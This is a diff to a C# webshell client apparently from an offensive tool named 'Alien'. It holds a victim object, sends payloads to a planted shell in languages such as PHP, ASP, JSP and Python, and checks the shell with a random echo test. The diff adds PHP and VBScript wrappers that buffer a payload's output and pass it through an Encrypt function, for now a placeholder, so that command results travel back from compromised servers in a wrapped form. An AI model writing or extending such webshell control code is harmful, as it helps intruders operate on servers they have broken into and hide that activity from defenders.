@@ -11,12 +11,14 @@ using System.Threading.Tasks;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Net;
+using System.Text.RegularExpressions;
 
 namespace Alien
 {
     public class clsWeb
     {
-        public clsVictim m_victim { get; set; }
+        public clsVictim m_victim { get; init; }
+        public clsTamper m_tamper { get; init; }
         public HttpClient m_clnt { get; set; }
 
         private AesGcm m_aesgcm { get; set; }
@@ -38,6 +40,16 @@ namespace Alien
             { enLanguage.JSPX, "jspx" },
             { enLanguage.CGI, "cgi" },
             { enLanguage.Python, "py" },
+        };
+
+        public Dictionary<enLanguage, Func<string, string, string>> m_dicPayloadWrapper = new Dictionary<enLanguage, Func<string, string, string>>()
+        {
+            {
+                enLanguage.PHP, fnWrapPHP
+            },
+            {
+                enLanguage.ASP, fnWrapVBScript
+            }
         };
 
         /// <summary>
@@ -90,11 +102,13 @@ namespace Alien
             { enLanguage.JSP, szInput => szInput } // nop
         };
 
-        public clsWeb(clsVictim victim)
+        public clsWeb(clsVictim victim, clsTamper tamper)
         {
             Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
 
             m_victim = victim;
+            m_tamper = tamper;
+
             var cookieContainer = new CookieContainer();
             var handler = new HttpClientHandler()
             {
@@ -488,7 +502,9 @@ namespace Alien
                 string szPattern = clsEzData.fnszGenerateRandomStr();
                 string szResp = await fnszSendPayload("test", new string[] { szPattern });
 
-                return string.Equals(szResp, szPattern);
+                bool bVal = string.Equals(szResp, szPattern);
+
+                return bVal;
             }
             catch (Exception ex)
             {
@@ -562,6 +578,12 @@ namespace Alien
                 const string split = "----------[THE CODE ABOVE WILL NOT BE INCLUDED]----------";
                 szPayload = szPayload.Split(new string[] { split }, StringSplitOptions.None).Last();
 
+                if (m_dicPayloadWrapper.ContainsKey(m_victim.ShellLanguage))
+                {
+                    string szEncryptor = string.Empty;
+                    szPayload = m_dicPayloadWrapper[m_victim.ShellLanguage](szPayload, szEncryptor);
+                }
+
                 string szSplitFunc = m_dicSplitter[m_victim.ShellLanguage].Replace("SPLITTER", szSplitter);
                 szPayload = $"{szSplitFunc}{szPayload}{szSplitFunc}";
 
@@ -572,6 +594,52 @@ namespace Alien
                 MessageBox.Show("File not found: " + szPayloadFilePath, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return string.Empty;
             }
+        }
+
+        private static string fnWrapVBScript(string szOriginalPayload, string szEncryptor)
+        {
+            string szHeader =
+                "\r\n" +
+                "Dim globalStringOutput\r\n" +
+                "Sub Echo(s)\r\n" +
+                "    globalStringOutput = globalStringOutput & s\r\n" +
+                "End Sub\r\n\r\n" +
+
+                (string.IsNullOrEmpty(szEncryptor) ?
+                "Function Encrypt(s)\r\n" +
+                "    ' TODO: Add VBScript encryption logic here\r\n" +
+                "    Encrypt = s\r\n" +
+                "End Function" : szEncryptor) + "\r\n\r\n";
+
+            string szFooter = "\r\n\r\nResponse.Write(Encrypt(globalStringOutput))\r\n";
+
+            string szProcessed = szOriginalPayload;
+            szProcessed = Regex.Replace(szProcessed, @"\bResponse\.Write\b", "Echo", RegexOptions.IgnoreCase);
+            szProcessed = Regex.Replace(szProcessed, @"\becho\b", "Echo", RegexOptions.IgnoreCase);
+
+            return $"{szHeader}{szProcessed}{szFooter}";
+        }
+
+        private static string fnWrapPHP(string szOriginalPayload, string szEncryptor)
+        {
+            string szHeader =
+                "\r\n" +
+                (string.IsNullOrEmpty(szEncryptor) ?
+                "function Encrypt($data) {\r\n" +
+                "    // TODO: Add PHP encryption logic here\r\n" +
+                "    return $data;\r\n" +
+                "}" : szEncryptor) +
+                "\r\n" +
+                "ob_start();\r\n\r\n";
+
+            string szFooter =
+                "\r\n\r\n$globalStringOutput = ob_get_clean();\r\n" +
+                "echo Encrypt($globalStringOutput);\r\n" +
+                "";
+
+            string szProcessed = szOriginalPayload.Replace("<?php", "").Replace("?>", "");
+
+            return $"{szHeader}{szProcessed}{szFooter}";
         }
     }
 }
